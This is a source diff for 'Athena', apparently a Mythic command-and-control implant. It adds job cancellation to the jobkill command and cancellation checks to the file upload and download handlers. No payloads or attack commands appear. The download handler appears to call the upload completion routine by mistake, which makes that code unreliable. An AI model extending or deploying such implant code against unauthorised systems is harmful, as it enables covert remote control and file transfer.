@@ -48,7 +48,6 @@ namespace Athena.Commands
         /// <param name="task">MythicTask object containing the parameters of the task</param>
         public async Task StartJob(MythicTask task)
         {
-            EventHandler handler;
             MythicJob job = activeJobs.GetOrAdd(task.id, new MythicJob(task));
             job.started = true;
 
@@ -71,12 +70,26 @@ namespace Athena.Commands
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "jobkill": //Maybe can be loaded? //Also add a kill command for processes
-                    this.responseResults.Add(new ResponseResult
+                    if (this.activeJobs.ContainsKey(task.parameters))
                     {
-                        user_output = "Not implemented yet.",
-                        completed = "true",
-                        task_id = job.task.id,
-                    });
+                        this.activeJobs[task.parameters].cancellationtokensource.Cancel();
+                        this.responseResults.Add(new ResponseResult
+                        {
+                            user_output = "Cancelled job",
+                            completed = "true",
+                            task_id = job.task.id,
+                        });
+                    }
+                    else
+                    {
+                        this.responseResults.Add(new ResponseResult
+                        {
+                            user_output = "Job doesn't exist",
+                            completed = "true",
+                            task_id = job.task.id,
+                            status = "error"
+                        });
+                    }
                     this.activeJobs.Remove(task.id, out _);
                     break;
                 case "link":
@@ -295,10 +308,12 @@ namespace Athena.Commands
         public async Task HandleUploadPiece(MythicResponseResult response)
         {
             MythicUploadJob uploadJob = await this.uploadHandler.GetUploadJob(response.task_id);
-            if (uploadJob.complete)
+            if (uploadJob.cancellationtokensource.IsCancellationRequested)
             {
+                this.activeJobs.Remove(response.task_id, out _);
                 await this.uploadHandler.CompleteUploadJob(response.task_id);
             }
+
             if(uploadJob.total_chunks == 0)
             {
                 uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
@@ -359,6 +374,11 @@ namespace Athena.Commands
         public async Task HandleDownloadPiece(MythicResponseResult response)
         {
             MythicDownloadJob downloadJob = await this.downloadHandler.GetDownloadJob(response.task_id);
+            if (downloadJob.cancellationtokensource.IsCancellationRequested)
+            {
+                this.activeJobs.Remove(response.task_id, out _);
+                await this.uploadHandler.CompleteUploadJob(response.task_id);
+            }
 
             if (string.IsNullOrEmpty(downloadJob.file_id) && string.IsNullOrEmpty(response.file_id))
             {
